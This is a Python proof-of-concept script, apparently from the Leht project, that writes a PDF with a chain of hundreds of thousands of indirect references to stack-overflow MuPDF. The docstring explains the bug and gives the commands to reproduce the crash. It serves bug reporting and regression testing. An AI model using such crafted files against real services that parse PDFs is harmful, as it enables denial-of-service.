#!/usr/bin/env python3
# SPDX-License-Identifier: AGPL-3.0-or-later
"""Generate a PDF that stack-overflows MuPDF via a long indirect-reference chain.

Object 4 references 5, 5 references 6, and so on. When MuPDF resolves the head
of the chain, pdf_resolve_indirect -> pdf_cache_object recurses once per link,
and a long enough chain exhausts the stack. No single object is deeply nested,
so MuPDF's parser nesting cap (~128 levels) does not apply -- the depth lives in
the references, not the syntax.

    python3 mupdf_refchain_stackoverflow.py chain.pdf 200000
    leht compress chain.pdf -o /dev/null    # SIGSEGV

This is upstream, not Leht: a pure-C program calling only pdf_save_document
crashes identically, and ASan reports a stack-overflow in pdf_cache_object.
See README.md for the full write-up. No artifact is committed because the file
must be many megabytes to trigger; regenerate it here when needed.
"""
import sys


def build(path, n):
    objs = [
        b"<< /Type /Catalog /Pages 2 0 R >>",
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Deep 4 0 R >>",
    ]
    for k in range(n):
        num = 4 + k
        objs.append(b"[%d 0 R]" % (num + 1) if k < n - 1 else b"[1]")

    out, offs = bytearray(b"%PDF-1.7\n"), []
    for i, o in enumerate(objs, 1):
        offs.append(len(out))
        out += b"%d 0 obj\n" % i + o + b"\nendobj\n"
    xref = len(out)
    out += b"xref\n0 %d\n0000000000 65535 f \n" % (len(objs) + 1)
    out += b"".join(b"%010d 00000 n \n" % o for o in offs)
    out += b"trailer\n<< /Size %d /Root 1 0 R >>\nstartxref\n%d\n%%%%EOF\n" % (
        len(objs) + 1, xref)
    open(path, "wb").write(bytes(out))
    print(f"{path}: {n} chained objects, {len(out) // 1024} KB")


if __name__ == "__main__":
    path = sys.argv[1] if len(sys.argv) > 1 else "chain.pdf"
    n = int(sys.argv[2]) if len(sys.argv) > 2 else 200000
    build(path, n)
